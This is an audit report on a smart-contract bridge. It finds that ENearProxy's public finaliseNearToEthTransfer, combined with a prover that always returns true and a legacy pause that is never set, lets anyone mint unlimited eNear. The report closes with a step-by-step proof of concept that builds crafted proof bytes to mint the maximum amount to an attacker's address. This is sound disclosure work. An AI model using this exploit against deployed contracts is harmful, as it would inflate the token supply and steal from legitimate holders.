Audit Report

## Title
`ENearProxy.finaliseNearToEthTransfer()` Allows Unauthorized eNear Minting via `FakeProver` and Admin Pause Bypass — (`evm/src/eNear/contracts/ENearProxy.sol`)

## Summary

`ENearProxy.finaliseNearToEthTransfer()` is an unrestricted external function whose only security gate is a `FakeProver` that unconditionally returns `true` and a pause flag that is never set during `initialize()`. Because `ENearProxy` is designed to be set as the admin of the non-upgradeable `eNear` contract, any unprivileged caller can supply crafted proof data to mint an arbitrary amount of eNear tokens to any address, with no NEAR locked on the NEAR side.

## Finding Description

**Root cause 1 — `FakeProver.proveOutcome()` always returns `true`:**

`FakeProver` implements `INearProver` and ignores all inputs:

```solidity
// evm/src/eNear/contracts/FakeProver.sol L6-9
contract FakeProver is INearProver {
    function proveOutcome(bytes calldata, uint64) external pure returns (bool) {
        return true;
    }
}
```

This is the intentional production prover for both `eNear` and `ENearProxy`, as confirmed by the README.

**Root cause 2 — `PAUSED_LEGACY_FIN_TRANSFER` is never set in `initialize()`:**

`SelectivePausableUpgradable.__Pausable_init_unchained()` explicitly sets `$._pausedFlags = 0`. The `ENearProxy.initialize()` calls `__Pausable_init()` but never sets `PAUSED_LEGACY_FIN_TRANSFER` (= `1 << 0`):

```solidity
// evm/src/eNear/contracts/ENearProxy.sol L39-49
__Pausable_init();          // _pausedFlags = 0
...
// PAUSED_LEGACY_FIN_TRANSFER is never set here
```

```solidity
// evm/src/omni-bridge/contracts/SelectivePausableUpgradable.sol L51-54
function __Pausable_init_unchained() internal onlyInitializing {
    SelectivePausableStorage storage $ = _getSelectivePausableStorage();
    $._pausedFlags = 0;
}
```

So `whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER)` passes immediately after deployment.

**Vulnerable public entry point:**

```solidity
// evm/src/eNear/contracts/ENearProxy.sol L80-90
function finaliseNearToEthTransfer(
    bytes memory proofData,
    uint64 proofBlockHeight
) external whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER) {
    require(
        prover.proveOutcome(proofData, proofBlockHeight),  // always true
        "Proof should be valid"
    );
    eNear.finaliseNearToEthTransfer(proofData, proofBlockHeight);
}
```

No role check. No caller restriction. The only guards are the pause flag (starts at 0) and the prover (always returns `true`).

**Admin bypass of eNear's own pause:**

The README explicitly states `ENearProxy` will be set as admin of `eNear`. The test suite confirms that when `ENearProxy` is admin, it can call `eNear.finaliseNearToEthTransfer()` even when eNear's `PAUSE_FINALISE_FROM_NEAR` flag is set:

```typescript
// evm/tests/eNearProxy.test.ts L126-141
await eNear.connect(eNearAdmin).adminPause(PAUSE_TRANSFER_TO_NEAR | PAUSE_FINALISE_FROM_NEAR)
// ...
await eNear.connect(eNearAdmin).adminSstore(9, ethers.zeroPadValue(await eNearProxy.getAddress(), 32))
await eNearProxy.connect(alice).mint(await eNear.getAddress(), alice.address, 100)
expect(await eNear.balanceOf(alice.address)).to.equal(100)  // succeeds despite pause
```

**Proof data format is publicly known:**

The exact byte layout that `eNear.finaliseNearToEthTransfer()` parses is exposed verbatim in `ENearProxy.mint()`:

```solidity
// evm/src/eNear/contracts/ENearProxy.sol L58-69
bytes memory fakeProofData = bytes.concat(
    new bytes(72),
    hex"01000000",
    abi.encodePacked(currentReceiptId),
    new bytes(24),
    abi.encodePacked(Borsh.swapBytes4(uint32(nearConnector.length))),
    abi.encodePacked(nearConnector),
    hex"022500000000",
    abi.encodePacked(Borsh.swapBytes16(amount)),
    abi.encodePacked(to),
    new bytes(280)
);
```

An attacker substitutes their own `to` address and any `amount`, and picks any receipt ID not yet consumed by `currentReceiptId`.

**Not listed in SECURITY.md:** The `SECURITY.md` documents known/accepted issues (H-01, H-02, L-01 through L-05) but does not mention this vulnerability.

## Impact Explanation

An unprivileged attacker can mint an unbounded supply of eNear (bridged NEAR on Ethereum) to any address without locking any NEAR on the NEAR side. This breaks the 1:1 backing invariant of the bridge, enabling theft of all real eNear liquidity held by legitimate holders (attacker dumps freshly minted tokens) and permanent inflation of the eNear supply. This matches the allowed Critical impact: **unauthorized minting of bridged funds** and **pause bypass enabling admin-equivalent bridge actions**.

## Likelihood Explanation

High. The attack requires no special role, no admin key, no front-running, and no external dependency. The only prerequisite is the explicitly documented production deployment state: `ENearProxy` set as admin of `eNear` and `FakeProver` set as the prover — both described as the deployment goal in the README. The proof data format is fully public. The attacker only needs to pick an unused receipt ID (any integer beyond `currentReceiptId`).

## Recommendation

Pause `PAUSED_LEGACY_FIN_TRANSFER` during `initialize()` so the legacy path is closed from the moment of deployment:

```solidity
function initialize(...) public initializer {
    __Pausable_init();
    _pause(PAUSED_LEGACY_FIN_TRANSFER);  // close legacy path immediately
    ...
}
```

Alternatively, remove `ENearProxy.finaliseNearToEthTransfer()` entirely. The README states the legacy `finaliseNearToEthTransfer` path is to be paused permanently; the function serves no purpose once `ENearProxy` controls minting via `mint()`.

## Proof of Concept

```
Setup (intended production state):
1. FakeProver deployed; set as prover for eNear and ENearProxy.
2. ENearProxy deployed — _pausedFlags = 0 (PAUSED_LEGACY_FIN_TRANSFER not set).
3. ENearProxy set as admin of eNear via adminSstore(9, ...).
4. eNear.finaliseNearToEthTransfer paused at the eNear level (as intended).

Attack:
5. Attacker constructs craftedProof using the public format from ENearProxy.mint():
     bytes.concat(
       new bytes(72), hex"01000000",
       abi.encodePacked(uint256(999999)),   // unused receipt ID
       new bytes(24),
       abi.encodePacked(Borsh.swapBytes4(uint32(nearConnector.length))),
       abi.encodePacked(nearConnector),
       hex"022500000000",
       abi.encodePacked(Borsh.swapBytes16(type(uint128).max)),
       abi.encodePacked(attackerAddress),
       new bytes(280)
     )

6. Attacker calls ENearProxy.finaliseNearToEthTransfer(craftedProof, 0):
   → whenNotPaused(1) passes (_pausedFlags == 0).
   → FakeProver.proveOutcome() returns true.
   → ENearProxy (as eNear admin) calls eNear.finaliseNearToEthTransfer(craftedProof, 0),
     bypassing eNear's own pause.
   → eNear's FakeProver returns true.
   → eNear parses craftedProof, mints type(uint128).max eNear to attackerAddress.

Reproducible as a Hardhat test extending evm/tests/eNearProxy.test.ts:

- adminSstore(9, eNearProxy address) to set ENearProxy as admin.
- adminPause eNear (as intended).
- Call eNearProxy.connect(attacker).finaliseNearToEthTransfer(craftedProof, 0) from an unprivileged signer.
- Assert eNear.balanceOf(attacker) == type(uint128).max.
